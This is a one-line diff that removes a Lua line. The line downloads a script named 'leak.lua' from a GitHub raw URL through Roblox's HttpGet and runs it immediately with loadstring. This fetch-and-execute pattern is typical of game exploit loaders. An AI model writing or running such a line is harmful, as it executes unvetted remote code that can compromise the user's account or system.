@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VertigoCool99/Script/main/TS/leak.lua", true))()
